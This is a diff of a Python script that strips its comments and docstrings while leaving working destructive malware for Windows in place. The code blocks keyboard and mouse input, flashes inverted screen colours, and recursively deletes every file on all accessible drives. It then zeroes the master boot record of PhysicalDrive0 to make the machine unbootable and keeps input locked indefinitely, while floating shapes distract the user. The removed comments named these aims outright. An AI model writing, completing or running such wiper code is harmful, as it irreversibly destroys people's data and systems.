@@ -6,11 +6,9 @@ import threading
 import tkinter as tk
 import random
 
-# Constants for GDI
 PATINVERT = 0x005A0049
 
 def glitch_screen(duration=10):
-    """Invert screen colors in a loop to make it glitchy."""
     user32 = ctypes.windll.user32
     gdi32 = ctypes.windll.gdi32
     hdc = user32.GetDC(0)
@@ -25,11 +23,9 @@ def glitch_screen(duration=10):
     user32.ReleaseDC(0, hdc)
 
 def disable_inputs():
-    """Disable mouse and keyboard input."""
     ctypes.windll.user32.BlockInput(True)
 
 def wipe_all_drives():
-    """Delete everything on all accessible drives."""
     drives = [chr(x) + ':\\' for x in range(65, 91) if os.path.exists(chr(x) + ':')]
     for drive in drives:
         for root, dirs, files in os.walk(drive, topdown=False):
@@ -47,7 +43,6 @@ def wipe_all_drives():
                     pass
 
 def overwrite_boot_sector():
-    """Overwrite MBR to make unbootable."""
     try:
         with open(r'\\.\PhysicalDrive0', 'wb') as disk:
             disk.write(b'\x00' * 512)
@@ -55,7 +50,6 @@ def overwrite_boot_sector():
         pass
 
 def spawn_shapes():
-    """Spawn random shapes flying around the desktop."""
     try:
         root = tk.Tk()
         root.attributes('-fullscreen', True, '-topmost', True, '-transparentcolor', 'black')
@@ -67,15 +61,13 @@ def spawn_shapes():
         screen_height = root.winfo_screenheight()
         shapes = []
         
-        # Create 30 bigger, brighter shapes
         for _ in range(30):
             shape_type = random.choice(['rect', 'circle'])
-            size = random.randint(50, 150)  # Bigger shapes
+            size = random.randint(50, 150) 
             x = random.randint(0, screen_width - size)
             y = random.randint(0, screen_height - size)
-            # Brighter colors
             color = f'#{random.randint(128, 255):02x}{random.randint(128, 255):02x}{random.randint(128, 255):02x}'
-            dx = random.randint(-10, 10)  # Faster movement
+            dx = random.randint(-10, 10)  
             dy = random.randint(-10, 10)
             if shape_type == 'rect':
                 shape = canvas.create_rectangle(x, y, x + size, y + size, fill=color, outline=color)
@@ -93,37 +85,24 @@ def spawn_shapes():
                         shapes[shapes.index((shape, dx, dy, size))] = (shape, -dx, dy, size)
                     if y1 < 0 or y1 > screen_height - size:
                         shapes[shapes.index((shape, dx, dy, size))] = (shape, dx, -dy, size)
-                root.after(30, move_shapes)  # Faster refresh
+                root.after(30, move_shapes)  
             except:
                 pass
         
         move_shapes()
-        root.update()  # Force window to show
+        root.update()  
         root.mainloop()
     except:
-        pass  # Keep going if tkinter fails
+        pass  
 
 if __name__ == "__main__":
-    # Start shapes first for visibility
     shape_thread = threading.Thread(target=spawn_shapes)
     shape_thread.start()
-    
-    # Small delay to ensure shapes render
     time.sleep(1)
-    
-    # Lock inputs
     disable_inputs()
-    
-    # Start glitch in parallel
     glitch_thread = threading.Thread(target=glitch_screen, args=(30,))
     glitch_thread.start()
-    
-    # Wipe files
     wipe_all_drives()
-    
-    # Nuke boot
     overwrite_boot_sector()
-    
-    # Keep inputs locked
     while True:
         time.sleep(1)
